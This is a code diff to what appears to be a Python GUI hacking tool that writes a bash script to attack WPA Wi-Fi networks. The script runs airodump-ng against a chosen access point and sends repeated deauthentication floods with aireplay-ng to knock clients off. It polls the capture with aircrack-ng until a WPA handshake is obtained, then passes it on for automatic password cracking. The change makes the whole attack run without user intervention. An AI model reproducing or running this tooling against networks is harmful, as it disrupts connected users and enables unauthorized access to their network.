@@ -1186,7 +1186,7 @@ if found_bssid:
         script.write("for ATTEMPT in 1 2 3 4 5 6 7 8 9 10; do\n")
         script.write(f"  rm -f {scan_file}-* 2>/dev/null\n\n")
         # Foreground airodump — gets real terminal, scans all networks properly
-        script.write(f"  sudo timeout 25 airodump-ng --essid '{essid}' -w '{scan_file}' --output-format csv --write-interval 1 $MON || true\n\n")
+        script.write(f"  sudo timeout 25 airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 $MON || true\n\n")
         # Clear ncurses mess and show clean output
         script.write("  clear\n")
         script.write("  echo '══════════════════════════════════════════'\n")
@@ -1217,34 +1217,61 @@ if found_bssid:
         script.write(f"  echo 'FAILED' > '{signal_file}'\n")
         script.write("  echo 'Press Enter to close'\n  read\n  exit 1\nfi\n\n")
 
-        # Step 3: Capture handshake
+        # Step 3: Capture handshake — FULLY AUTOMATIC
+        # Run airodump in background, deauth in background, poll .cap for handshake.
+        # When handshake is found → stop everything, write signal file, exit.
         script.write("echo ''\necho '[3/3] Capturing handshake on channel $CHANNEL...'\n")
         script.write("echo '    Target: $ESSID_FOUND ($BSSID)'\n")
-        script.write("echo '    Deauth packets will be sent automatically.'\n")
-        script.write("echo '    When you see \"WPA handshake: $BSSID\" press Ctrl+C'\necho ''\n\n")
-        script.write("(\n  sleep 3\n")
-        script.write("  for i in $(seq 1 20); do\n")
-        script.write("    sudo aireplay-ng --deauth 15 -a $BSSID $MON >/dev/null 2>&1\n")
-        script.write("    sleep 5\n  done\n) &\nDEAUTH_PID=$!\n\n")
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
-        script.write("kill $DEAUTH_PID 2>/dev/null; wait $DEAUTH_PID 2>/dev/null\n\n")
+        script.write("echo '    Deauth + capture running automatically.'\n")
+        script.write("echo '    Will stop as soon as handshake is captured.'\necho ''\n\n")
 
-        # Find .cap and verify handshake
-        script.write(f"CAP_FILE=$(ls -t {essid_dir}/*.cap 2>/dev/null | head -1)\n")
-        script.write("if [ -n \"$CAP_FILE\" ]; then\n")
-        script.write("  echo ''\n  echo \"[OK] Capture file: $CAP_FILE\"\n")
-        script.write("  if aircrack-ng \"$CAP_FILE\" 2>&1 | grep -q '[1-9] handshake'; then\n")
-        script.write("    echo '[OK] Valid WPA handshake confirmed!'\n")
-        script.write(f"    echo \"$CAP_FILE\" > '{signal_file}'\n")
-        script.write("    echo '[*] Cracking will start in MAXIM output window...'\n")
-        script.write("  else\n")
-        script.write("    echo '[!] No valid handshake in capture file.'\n")
-        script.write("    echo '[*] Try again — make sure a client is connected to the network.'\n")
-        script.write(f"    echo 'NO_CAP' > '{signal_file}'\n")
+        # Start airodump capture in background (write to file, no display needed)
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON >/dev/null 2>&1 &\n")
+        script.write("CAPTURE_PID=$!\n")
+        script.write("sleep 2\n\n")
+
+        # Start deauth in background
+        script.write("(\n")
+        script.write("  for i in $(seq 1 30); do\n")
+        script.write("    sudo aireplay-ng --deauth 10 -a $BSSID $MON >/dev/null 2>&1\n")
+        script.write("    sleep 4\n")
+        script.write("  done\n")
+        script.write(") &\nDEAUTH_PID=$!\n\n")
+
+        # Poll for handshake every 5 seconds (up to 3 minutes)
+        script.write("HANDSHAKE_FOUND=0\n")
+        script.write("for CHECK in $(seq 1 36); do\n")
+        script.write(f"  CAP_FILE=$(ls -t {essid_dir}/*.cap 2>/dev/null | head -1)\n")
+        script.write("  if [ -n \"$CAP_FILE\" ]; then\n")
+        script.write("    if aircrack-ng \"$CAP_FILE\" 2>&1 | grep -q '[1-9] handshake'; then\n")
+        script.write("      HANDSHAKE_FOUND=1\n")
+        script.write("      break\n")
+        script.write("    fi\n")
         script.write("  fi\n")
+        script.write("  ELAPSED=$((CHECK * 5))\n")
+        script.write("  echo \"  Waiting for handshake... ${ELAPSED}s\"\n")
+        script.write("  sleep 5\n")
+        script.write("done\n\n")
+
+        # Stop capture + deauth
+        script.write("sudo kill $CAPTURE_PID 2>/dev/null\n")
+        script.write("sudo kill $DEAUTH_PID 2>/dev/null\n")
+        script.write("sudo killall airodump-ng 2>/dev/null\n")
+        script.write("sudo killall aireplay-ng 2>/dev/null\n")
+        script.write("wait $CAPTURE_PID 2>/dev/null\n")
+        script.write("wait $DEAUTH_PID 2>/dev/null\n\n")
+
+        script.write("if [ $HANDSHAKE_FOUND -eq 1 ]; then\n")
+        script.write("  echo ''\n")
+        script.write("  echo '  ✓ HANDSHAKE CAPTURED!'\n")
+        script.write("  echo \"  File: $CAP_FILE\"\n")
+        script.write("  echo '  Cracking will start in MAXIM output window...'\n")
+        script.write(f"  echo \"$CAP_FILE\" > '{signal_file}'\n")
         script.write("else\n")
+        script.write("  echo ''\n")
+        script.write("  echo '  [!] No handshake captured after 3 minutes.'\n")
+        script.write("  echo '  Make sure a client is connected to the network.'\n")
         script.write(f"  echo 'NO_CAP' > '{signal_file}'\n")
-        script.write("  echo '[!] No .cap file created.'\n")
         script.write("fi\n\n")
         script.write("echo ''\necho 'Press Enter to close.'\nread\n")
 
@@ -1274,38 +1301,33 @@ if found_bssid:
             return False
 
     def _check_handshake_done(self):
-        """Poll .cap files for valid handshake, then kill terminal and crack internally."""
-        import glob
-        essid_dir = getattr(self, '_hs_essid_dir', None)
-        if not essid_dir:
-            self._hs_poll_timer.stop()
+        """Poll signal file. Bash script writes cap path when handshake is found."""
+        signal_file = self._HS_SIGNAL_FILE
+        if not os.path.exists(signal_file):
+            return  # Not ready yet — keep polling
+
+        # Read signal file
+        try:
+            with open(signal_file, 'r') as f:
+                content = f.read().strip()
+            os.remove(signal_file)
+        except Exception:
             return
 
-        # Check signal file for FAILED status
-        signal_file = self._HS_SIGNAL_FILE
-        if os.path.exists(signal_file):
-            try:
-                with open(signal_file, 'r') as f:
-                    content = f.read().strip()
-                os.remove(signal_file)
-            except Exception:
-                content = ""
+        # Check what the script reported
+        if content in ("FAILED", "NO_CAP", ""):
+            self._hs_poll_timer.stop()
+            self._hs_essid_dir = None
             if content == "FAILED":
-                self._hs_poll_timer.stop()
-                self._hs_essid_dir = None
                 self.terminal.appendPlainText(f"\n[!] Could not find network — capture failed.\n")
-                return
+            else:
+                self.terminal.appendPlainText(f"\n[!] No valid handshake captured.\n")
+            return
 
-        # Check all .cap files in essid dir for a valid handshake
-        cap_files = sorted(glob.glob(f"{essid_dir}/*.cap"), key=os.path.getmtime, reverse=True)
-        cap_file = None
-        for cf in cap_files:
-            if self._cap_has_handshake(cf):
-                cap_file = cf
-                break
-
-        if not cap_file:
-            return  # No valid handshake yet — keep waiting
+        # content is the .cap file path
+        cap_file = content
+        if not os.path.exists(cap_file):
+            return  # File not there yet
 
         # Valid handshake found — stop polling, kill external terminal, crack internally
         self._hs_poll_timer.stop()
